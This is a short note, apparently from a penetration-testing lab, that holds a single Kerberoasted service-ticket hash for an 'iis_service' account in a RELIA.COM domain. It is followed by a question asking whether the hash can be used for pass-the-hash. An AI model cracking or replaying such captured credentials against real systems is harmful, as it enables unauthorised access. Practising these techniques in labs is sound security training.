$krb5tgs$23$*iis_service$RELIA.COM$relia.com/iis_service*$3daf24fa7648a95427b65bbd4f2b4f2f$36bebd49f3dd665786ebd532783c5df0d95515aa3112a85c823202ce30ae4f34f12205d036fe7051c0c5d2068e446884efd1e457faa4da8ac27991604642a8ed5c3b50c912a3a77d045f01eecb37da691ff36dcfbae426f98efef35e20a5220f59685997732a34be192cccb7c0b294094f1ddcc4c21321db6be83a3be599af02c0b65552d2514a0d6516f1caf89aad0a8f33bd71a370a1e8107d0aa1ab11f75734d4193625dc5fd87062e975838c8dcfb0d8f483bdc28462d9143b6b21bd5a5adfdc60d60e88b612a61c80c92fe7c967e8293f0471514698ecbf6d20ca91e048ac195b149371da83fd4d66f4ce0ab2e3d183fbb5ac7892553071a0458d37071985a42bfff35340d9e5a3ccfb82ed5f4a059fafabb670618aeefdf6a42aa019c8e9feea6a44372863e303c15a4c1997c438568b85c9e672f8d0f4857c21b0fc1e8a69e635259cba3879dfa8c7a7b5a3acfe13535db1e6984c4ab78681b939fb21996c6ae1ed9cca402812a579b2f689f06e318fffd0abff0b8e66e2cfb4da6677a175a6066c8f2c60ba2c705ca315c9788b192fb553a1aa28e9e044a3867722510bebb666829c22163d875e8bae1b5a31c2a7616251d78c1b42c1c4e41b9637413bbb9f3a3645137578e80ef66bd9475f7ea412eb15ed6dde828474c0e9b2382f7919b373e4d95a9717aa4a162b94a2fab4790906f827fde4405e0095b802d9ca4d82090a0cd094207a1409e49015fbea82804e1ef00dc658b260b804b8a56fc48e56d7cdc57fb0ff5d331f2593511ff43e4f6e040583258fb3b472a6454019d87a9adf44d35afffca921c1c88f8b6ad36a9f934577a791ddc231aeba1d5a516761468ea18abebef7a049ffa5f66cf9997fe8438a51c83f0f93a8b4e2f075ab65f97e83cf3166f6a26285d5bd441616b88282c74a8d41183f55900da7a48195017c3342c2d5c364aae531f497a098d5111556b82c2df261f2ff806aaa14b5202a32bb6faa4f8a289dd437b8907bd895fdcbedb901733e48bbf5a9f0470a7a1a2cb228cdda72a5ea0b751b20b7878efc71306a58ab50a7fedaf101baf52d73e266eed08f5409e0c8def5e7d8dca9ace906b127fa35978c29adc359d2521e2a456cf11b47aa5f105fc28a01f3af7bf97b3487608f45c181680441b36160b9d379f2ab83b5ca76b4272dc173c3e6e7b1821d9cdb17a68bdaadfbf5502dada62f245c45820fe4c388340ac2c8486887ae42c6c017b5469077537ac5c1d884c24e73ab3d551cdb2d4eb5d53beddc996de2f6fbae03c00289fc2a4165f2321365c060145099be7f9b1da9acecacf64514a2b5a104a99229a3d1b8721f595d84ddda84c4d1401acd5f1e937428677be58b

```

Can I pth with this?

